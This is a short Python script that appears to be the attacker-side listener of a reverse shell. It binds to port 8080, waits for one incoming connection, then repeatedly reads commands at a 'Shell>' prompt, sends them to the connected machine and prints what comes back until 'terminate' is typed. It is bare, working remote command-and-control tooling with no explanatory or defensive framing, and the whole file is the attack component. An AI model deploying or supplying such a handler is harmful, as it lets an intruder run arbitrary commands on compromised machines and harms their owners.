import socket

def connect():

    server = socket.socket()
    server.bind(("0.0.0.0", 8080))

    server.listen(1)

    print("[+] Listening for incoming connection on port 8080")

    client, address = server.accept()

    print(f"[+] Connection received from {address}")

    while True:

        command = input("Shell> ")

        if command == "terminate":

            client.send(command.encode())
            client.close()
            break

        else:

            client.send(command.encode())

            response = client.recv(4096)

            print(response.decode(errors="ignore"))

def main():
    connect()

if __name__ == "__main__":
    main()
